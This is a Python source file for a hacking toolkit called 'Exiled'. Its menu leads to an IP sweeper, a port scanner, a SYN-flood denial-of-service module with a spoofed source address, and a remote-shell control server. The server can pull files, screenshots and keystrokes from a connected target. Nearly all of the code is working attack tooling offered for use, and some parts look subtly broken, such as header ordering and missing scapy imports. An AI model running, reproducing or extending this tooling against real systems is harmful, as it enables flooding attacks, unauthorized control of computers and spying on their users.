#!/usr/bin/env python3

#check to see if modules are installed and if not, install them

pkglist = ["socket", "termcolor", "sys", "os", "time", "multiprocessing", "subprocess", "json", "pprint", "pynput", "scapy.all"]
import importlib
def install_and_import(package):
	try:
		importlib.import_module(package)
	except ImportError:
		import pip
		pip.main(['install', package])
	finally:
		globals()[package] = importlib.import_module(package)

for x in pkglist :
	install_and_import(x)
def main() :
	#socket timeout
	socket.setdefaulttimeout(0.01)

	#loading screen
	print("Starting" + termcolor.colored(" Exiled", 'red') + "...")
	time.sleep(1)

	programToRun = 0

	#----------------------------------------------PROGRAM SELECTOR----------------------------------
	#print logo
	def logo1() :
		os.system('clear')
		print("===================================================================================================")
		print(termcolor.colored("                                                                                          dddddddd\nEEEEEEEEEEEEEEEEEEEEEE                      iiii  lllllll                                 d::::::d\nE::::::::::::::::::::E                     i::::i l:::::l                                 d::::::d\nE::::::::::::::::::::E                      iiii  l:::::l                                 d::::::d\nEE::::::EEEEEEEEE::::E                            l:::::l                                 d:::::d\n  E:::::E       EEEEEE",'red') + termcolor.colored("xxxxxxx      xxxxxxx",'magenta') + termcolor.colored("iiiiiii  l::::l     eeeeeeeeeeee        ddddddddd:::::d\n  E:::::E", 'red') + termcolor.colored("              x:::::x    x:::::x ", 'magenta') + termcolor.colored("i:::::i  l::::l   ee::::::::::::ee    dd::::::::::::::d\n  E::::::EEEEEEEEEE     ", 'red') + termcolor.colored("x:::::x  x:::::x",'magenta') + termcolor.colored("   i::::i  l::::l  e::::::eeeee:::::ee d::::::::::::::::d\n  E:::::::::::::::E",'red') + termcolor.colored("      x:::::xx:::::x",'magenta') + termcolor.colored("    i::::i  l::::l e::::::e     e:::::ed:::::::ddddd:::::d\n  E:::::::::::::::E",'red') + termcolor.colored("       x::::::::::x ",'magenta') + termcolor.colored("    i::::i  l::::l e:::::::eeeee::::::ed::::::d    d:::::d\n  E::::::EEEEEEEEEE   ",'red')+termcolor.colored("     x::::::::x  ",'magenta')+termcolor.colored("    i::::i  l::::l e:::::::::::::::::e d:::::d     d:::::d\n  E:::::E   ",'red')+termcolor.colored("               x::::::::x ",'magenta')+termcolor.colored("     i::::i  l::::l e::::::eeeeeeeeeee  d:::::d     d:::::d\n  E:::::E       EEEEEE ",'red')+termcolor.colored("   x::::::::::x    ",'magenta')+termcolor.colored(" i::::i  l::::l e:::::::e           d:::::d     d:::::d\nEE::::::EEEEEEEE:::::E ",'red')+termcolor.colored("  x:::::xx:::::x  ",'magenta')+termcolor.colored(" i::::::il::::::le::::::::e          d::::::ddddd::::::dd\nE::::::::::::::::::::E ",'red')+termcolor.colored(" x:::::x  x:::::x ",'magenta')+termcolor.colored(" i::::::il::::::l e::::::::eeeeeeee   d:::::::::::::::::d\nE::::::::::::::::::::E ",'red')+termcolor.colored("x:::::x    x:::::x ",'magenta')+termcolor.colored("i::::::il::::::l  ee:::::::::::::e    d:::::::::ddd::::d\nEEEEEEEEEEEEEEEEEEEEEE",'red')+termcolor.colored("xxxxxxx      xxxxxxx",'magenta')+termcolor.colored("iiiiiiiillllllll    eeeeeeeeeeeeee     ddddddddd   ddddd",'red'))
		print("=============================================================================================" + termcolor.colored("V1.3",'yellow', attrs=['bold']) + "== ")
		main()
	#reprint logo and clear screen
	def logo2(programToRun) :
		os.system('clear')
		
		print("===================================================================================================")
		print(termcolor.colored("                                                                                          dddddddd\nEEEEEEEEEEEEEEEEEEEEEE                      iiii  lllllll                                 d::::::d\nE::::::::::::::::::::E                     i::::i l:::::l                                 d::::::d\nE::::::::::::::::::::E                      iiii  l:::::l                                 d::::::d\nEE::::::EEEEEEEEE::::E                            l:::::l                                 d:::::d\n  E:::::E       EEEEEE",'red') + termcolor.colored("xxxxxxx      xxxxxxx",'magenta') + termcolor.colored("iiiiiii  l::::l     eeeeeeeeeeee        ddddddddd:::::d\n  E:::::E", 'red') + termcolor.colored("              x:::::x    x:::::x ", 'magenta') + termcolor.colored("i:::::i  l::::l   ee::::::::::::ee    dd::::::::::::::d\n  E::::::EEEEEEEEEE     ", 'red') + termcolor.colored("x:::::x  x:::::x",'magenta') + termcolor.colored("   i::::i  l::::l  e::::::eeeee:::::ee d::::::::::::::::d\n  E:::::::::::::::E",'red') + termcolor.colored("      x:::::xx:::::x",'magenta') + termcolor.colored("    i::::i  l::::l e::::::e     e:::::ed:::::::ddddd:::::d\n  E:::::::::::::::E",'red') + termcolor.colored("       x::::::::::x ",'magenta') + termcolor.colored("    i::::i  l::::l e:::::::eeeee::::::ed::::::d    d:::::d\n  E::::::EEEEEEEEEE   ",'red')+termcolor.colored("     x::::::::x  ",'magenta')+termcolor.colored("    i::::i  l::::l e:::::::::::::::::e d:::::d     d:::::d\n  E:::::E   ",'red')+termcolor.colored("               x::::::::x ",'magenta')+termcolor.colored("     i::::i  l::::l e::::::eeeeeeeeeee  d:::::d     d:::::d\n  E:::::E       EEEEEE ",'red')+termcolor.colored("   x::::::::::x    ",'magenta')+termcolor.colored(" i::::i  l::::l e:::::::e           d:::::d     d:::::d\nEE::::::EEEEEEEE:::::E ",'red')+termcolor.colored("  x:::::xx:::::x  ",'magenta')+termcolor.colored(" i::::::il::::::le::::::::e          d::::::ddddd::::::dd\nE::::::::::::::::::::E ",'red')+termcolor.colored(" x:::::x  x:::::x ",'magenta')+termcolor.colored(" i::::::il::::::l e::::::::eeeeeeee   d:::::::::::::::::d\nE::::::::::::::::::::E ",'red')+termcolor.colored("x:::::x    x:::::x ",'magenta')+termcolor.colored("i::::::il::::::l  ee:::::::::::::e    d:::::::::ddd::::d\nEEEEEEEEEEEEEEEEEEEEEE",'red')+termcolor.colored("xxxxxxx      xxxxxxx",'magenta')+termcolor.colored("iiiiiiiillllllll    eeeeeeeeeeeeee     ddddddddd   ddddd",'red'))
		print("=============================================================================================" + termcolor.colored("V1.3",'yellow', attrs=['bold']) + "== ")
		if (programToRun == "1") :
			ipscanner()
		elif (programToRun == "2") :
			dos()
		elif (programToRun == "3") :
			pscanmain()
		elif (programToRun == "4") :
			exiled_server()
		elif (programToRun == "5") :
			ex_help()
		elif (programToRun == "6") :
			programExit()		
		else :
			main()
	#choose the program
	def main() :
		programToRun = str(input(termcolor.colored("\nWhich program would you like to run?",'yellow') + termcolor.colored("\n[1]",'blue') + " Ip address scan \n" + termcolor.colored("[2]",'blue') + " Dos\n"+ termcolor.colored("[3]",'blue') + " Port scanner\n" + termcolor.colored("[4]",'blue') + " Exiled Server\n"  + termcolor.colored("[5]",'blue') + " Help\n" + termcolor.colored("[6]",'blue') + " Exit\n"  + termcolor.colored("\n[>]", 'magenta') + " "))
		logo2(programToRun)
	#-----------------------------------------------PROGRAM SELECTOR----------------------------------

	#-----------------------------------------------Help----------------------------------------------
	def ex_help() :
		print("---------------------HELP PAGE------------------ \n" + "To be added in next version")
		go = input("enter to go back")
		logo1()
	#-----------------------------------------------Help----------------------------------------------

	#-----------------------------------------------IP ADDRESS SCANNER--------------------------------
	def run(ipaddress, num, showErrors) :

		try:
			
			if (ipaddress.lower() == "d") :
				sock = socket.socket()
				sock.connect(("192.168.1." + str(num),80))
				print(termcolor.colored("[+]",'green') + "192.168.1." + str(num) + " is active")
				sock.close()
				
			else :
				sock = socket.socket()
				sock.connect((ipaddress + str(num),80))
				print(termcolor.colored("[+]",'green') + ipaddress + str(num) + " is active")
				sock.close()
		except:
			if (showErrors.lower() == "y") :
				if (ipaddress.lower() == "d") : 
					print (termcolor.colored("[-]", 'red') + "192.168.1." + str(num) + " is inactive")
				else :
					print (termcolor.colored("[-]", 'red') + ipaddress + str(num) + " is inactive")
		if (num == 255) :
			currentProgram = "1"
			backtomain(currentProgram)				

	def floop(ipaddress, showErrors) :
		for num in range(1,256) :
			run(ipaddress, num, showErrors)
	def ipscanner() :
		print(termcolor.colored("[Ex:]", 'cyan') + " Enter D for 192.168.1.")
		ipaddress = str(input(termcolor.colored("[#]", 'blue') + " Enter first 3 bits of ip address. i.e (123.123.123.) : "   + termcolor.colored("\n[>]", 'magenta') + " "))
		showErrors = str(input(termcolor.colored("[#]", 'blue') + " Would you like to show closed connections? Y/N "   + termcolor.colored("\n[>]", 'magenta') + " "))

		print(termcolor.colored("[Ex:]", 'cyan') + " Running...")
		floop(ipaddress, showErrors)
	#--------------------------------------------IP ADDRESS SCANNER----------------------------------------------------

	#---------------------------------------------DOS------------------------------------------------------------------
	def dos() :
		runTime = 0
		if (len(sys.argv) == 5) :
			ip_src = sys.argv[1]
			ip_dest = sys.argv[2]
			ip_port = int(sys.argv[3])                                             
			amount = int(sys.argv[4]) 
			for packssent in range(amount) :
				Ip_header = IP(src = ip_src, dst = ip_dest)
				tcp_header = TCP(flags = "S", sport = RandShort(), dport = ip_port)
				pack = tcp_header / Ip_header / Raw(RandString(size=10000))
				try :
					startTimer = time.time()
					send(pack, verbose=0)
					endTimer = time.time()
					runTime = endTimer - startTimer
					if (runTime > 2) :
						print(termcolor.colored("[!]", 'yellow') + " Warning: packet could not send, showing new options.")
						currentProgram = "2"
						backtomain(currentProgram)
					print(termcolor.colored("[+]", 'green') + "packet "+ str(packssent + 1) + " sent")
				except Exception as e:
					print(termcolor.colored("[-]", 'red') + "Could not send packet. Check inputs")
		else :
			#print(termcolor.colored("[!]", 'yellow') + " Note: you can use sys.argvs instead of inputs. i.e python3 dos.py source_ip dest_ip port amount")
			ip_src = str(input(termcolor.colored("[#]", 'blue') + " What is the source ip? "   + termcolor.colored("\n[>]", 'magenta') + " "))
			ip_dest = str(input(termcolor.colored("[#]", 'blue') + " What is the destination ip? "   + termcolor.colored("\n[>]", 'magenta') + " "))
			ip_port = int(input(termcolor.colored("[#]", 'blue') + " Select port to use: "   + termcolor.colored("\n[>]", 'magenta') + " "))
			amount = int(input(termcolor.colored("[#]", 'blue') + " How many packets to send: "   + termcolor.colored("\n[>]", 'magenta') + " "))
			print(termcolor.colored("[Ex:]",'cyan') + " Starting Dos attack against " + ip_dest + "...")
			for packssent in range(amount) :
				Ip_header = IP(src = ip_src, dst = ip_dest)
				tcp_header = TCP(flags = "S", sport = RandShort(), dport = ip_port)
				pack = Ip_header / tcp_header / Raw(RandString(size=10000))
				try :

					startTimer = time.time()
					send(pack, verbose=0)
					endTimer = time.time()
					runTime = endTimer - startTimer
					if (runTime > 2) :
						print(termcolor.colored("[!]", 'yellow') + " Warning: packet could not send, showing new options.")
						currentProgram = "2"
						backtomain(currentProgram)
					print(termcolor.colored("[+]", 'green') + "packet " + str(packssent + 1) + " sent")
				except Exception as e:
					print(e)
					print(termcolor.colored("[-]", 'red') + "Could not send packet. Check inputs")
		currentProgram = "2"
		backtomain(currentProgram)
	#---------------------------------------------------DOS------------------------------------------------------------

	#--------------------------------------------PORT SCANNER----------------------------------------------------------
	def scanLoop(ipaddress,port, showClosed) :
		print(termcolor.colored("\n[Ex:]", 'cyan') +" starting scan on " + ipaddress + "\n")
		for ports in range(1,port):
			portScan(ipaddress,ports, showClosed, port)


	def portScan(ipaddress,port, showClosed, ports):
		
		try:
			sock = socket.socket()

			sock.connect((ipaddress,port))

			print(termcolor.colored("[+]",'green') + " Port "+ str(port) +" is open on ip " + str(ipaddress))
			sock.close()
		except:

			if (showClosed == 'y') :
				print(termcolor.colored("[-]", 'red') + " Port " + str(port) + " is closed on ip" + str(ipaddress))
			else :
				pass
		if(port == ports - 1) :
			currentProgram = "3"
			backtomain(currentProgram)
	def pscanmain() :
		ipaddress = input(termcolor.colored("[#] ", 'blue') + "ip address to scan? (split with comma)"  + termcolor.colored("[>]", 'magenta') + " ")
		port = int(input(termcolor.colored("[#] ", 'blue') + "what max range of ports would you like to try? "  + termcolor.colored("[>]", 'magenta') + " ")) + 1
		showClosed = str(input(termcolor.colored("[#] ", 'blue') +"Would you like to show closed connections? y/n: "  + termcolor.colored("[>]", 'magenta') + " ").lower())
		if ',' in ipaddress:
			print("scanning multiple")
			for ip_addr in ipaddress.split(','):
				scanLoop(ip_addr.strip(' '),port, showClosed)
		else:
			scanLoop(ipaddress,port,showClosed)
	#--------------------------------------------PORT SCANNER----------------------------------------------------------

	#--------------------------------------------Exiled server----------------------------------------------------------
	def reliable_send(data, target, ip):
		jsondata = json.dumps(data)
		target.send(jsondata.encode())

	def reliable_recv(target, ip):
		data = ''
		while True:
			try:
				data = data + target.recv(1024).decode().rstrip()
				return json.loads(data)
			except ValueError:
				continue

	def upload_file(file_name, target, ip):
	        f = open(file_name, 'rb')
	        target.send(f.read())


	def download_file(file_name, target, ip):
		f = open(file_name, 'wb')
		target.settimeout(5)
		chunk = target.recv(1024)
		while chunk:
			f.write(chunk)
			try:
				chunk = target.recv(1024)
			except socket.timeout as e:
				break
		target.settimeout(None)
		f.close()

	def screenshot(file_name, target, ip) :
		f = open(file_name, 'wb')
		target.settimeout(5)
		chunk = target.recv(1024)
		while chunk:
			f.write(chunk)
			try:
				chunk = target.recv(1024)
			except socket.timeout as e:
				break
		target.settimeout(None)
		f.close()

	def target_communication(target, ip):
		while True:
			command = input('* Shell~%s: ' % str(ip))
			reliable_send(command, target, ip)
			if command == 'quit':
				socket.setdefaulttimeout(0.01)
				logo1()
			elif command == 'clear':
				os.system('clear')
			elif command[:3] == 'cd ':
				pass
			elif command[:8] == 'download':
				download_file(command[9:], target, ip)
			elif command[:6] == 'upload':
				upload_file(command[7:], target, ip)
			elif command == 'screenshot':
				print("attempting to download")
				screenshot('img.png', target, ip)
			elif command == 'keys' :
				print("recording keys")
				pass
			elif command == 'keys_stop' :
				print("stopping and printing")
				result = reliable_recv(target, ip)
				print(*result)
				pass
			else:
				result = reliable_recv(target, ip)
				print(result)


	def exiled_server() :
		socket.setdefaulttimeout(None)
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.bind(('192.168.1.2', 5555))
		print('[+] Listening For The Incoming Connections')
		sock.listen(5)
		target, ip = sock.accept()
		print('[+] Target Connected From: ' + str(ip))
		target_communication(target, ip)
	#--------------------------------------------Exiled server----------------------------------------------------------

	#--------------------------------------------PROGRAM REUSE THING---------------------------------------------------
	def backtomain(currentProgram) :
		backToMenu = int(input(termcolor.colored("\n[Ex:]", 'cyan') + "Select an option: \n\n 1. Reuse the same program \n 2. Back to menu \n 3. Exit \n" + termcolor.colored("[>]", 'magenta') + " "))
		programToRun = currentProgram
		if (backToMenu == 1) :
			logo2(programToRun)
		if (backToMenu == 2) :
			logo1()
		if (backToMenu == 3) :
			programExit()
		else :
			backtomain(currentProgram)
	#--------------------------------------------PROGRAM REUSE THING---------------------------------------------------

	#--------------------------------------------EXIT THE PROGRAM---------------------------------------------------
	def programExit() :
		os.system("clear")
		print("===================================================================================================")
		print(termcolor.colored("                                                                                          dddddddd\nEEEEEEEEEEEEEEEEEEEEEE                      iiii  lllllll                                 d::::::d\nE::::::::::::::::::::E                     i::::i l:::::l                                 d::::::d\nE::::::::::::::::::::E                      iiii  l:::::l                                 d::::::d\nEE::::::EEEEEEEEE::::E                            l:::::l                                 d:::::d\n  E:::::E       EEEEEE",'red') + termcolor.colored("xxxxxxx      xxxxxxx",'magenta') + termcolor.colored("iiiiiii  l::::l     eeeeeeeeeeee        ddddddddd:::::d\n  E:::::E", 'red') + termcolor.colored("              x:::::x    x:::::x ", 'magenta') + termcolor.colored("i:::::i  l::::l   ee::::::::::::ee    dd::::::::::::::d\n  E::::::EEEEEEEEEE     ", 'red') + termcolor.colored("x:::::x  x:::::x",'magenta') + termcolor.colored("   i::::i  l::::l  e::::::eeeee:::::ee d::::::::::::::::d\n  E:::::::::::::::E",'red') + termcolor.colored("      x:::::xx:::::x",'magenta') + termcolor.colored("    i::::i  l::::l e::::::e     e:::::ed:::::::ddddd:::::d\n  E:::::::::::::::E",'red') + termcolor.colored("       x::::::::::x ",'magenta') + termcolor.colored("    i::::i  l::::l e:::::::eeeee::::::ed::::::d    d:::::d\n  E::::::EEEEEEEEEE   ",'red')+termcolor.colored("     x::::::::x  ",'magenta')+termcolor.colored("    i::::i  l::::l e:::::::::::::::::e d:::::d     d:::::d\n  E:::::E   ",'red')+termcolor.colored("               x::::::::x ",'magenta')+termcolor.colored("     i::::i  l::::l e::::::eeeeeeeeeee  d:::::d     d:::::d\n  E:::::E       EEEEEE ",'red')+termcolor.colored("   x::::::::::x    ",'magenta')+termcolor.colored(" i::::i  l::::l e:::::::e           d:::::d     d:::::d\nEE::::::EEEEEEEE:::::E ",'red')+termcolor.colored("  x:::::xx:::::x  ",'magenta')+termcolor.colored(" i::::::il::::::le::::::::e          d::::::ddddd::::::dd\nE::::::::::::::::::::E ",'red')+termcolor.colored(" x:::::x  x:::::x ",'magenta')+termcolor.colored(" i::::::il::::::l e::::::::eeeeeeee   d:::::::::::::::::d\nE::::::::::::::::::::E ",'red')+termcolor.colored("x:::::x    x:::::x ",'magenta')+termcolor.colored("i::::::il::::::l  ee:::::::::::::e    d:::::::::ddd::::d\nEEEEEEEEEEEEEEEEEEEEEE",'red')+termcolor.colored("xxxxxxx      xxxxxxx",'magenta')+termcolor.colored("iiiiiiiillllllll    eeeeeeeeeeeeee     ddddddddd   ddddd",'red'))
		print("=============================================================================================" + termcolor.colored("V1.3",'yellow', attrs=['bold']) + "== ")

		print(termcolor.colored("[Ex:]", 'cyan') +"Exiting...")
		time.sleep(1)
		os.system("clear")
		sys.exit()
	#--------------------------------------------EXIT THE PROGRAM---------------------------------------------------

	logo1()
	                                                                                                                                                                                                                                             

	#input msg = [#] - blue
	#warning = [!] - yellow
	#error = [-] - red
	#success = [+] - green
	#message = [Ex:] - cyan
	#user input = [>] - magenta
main()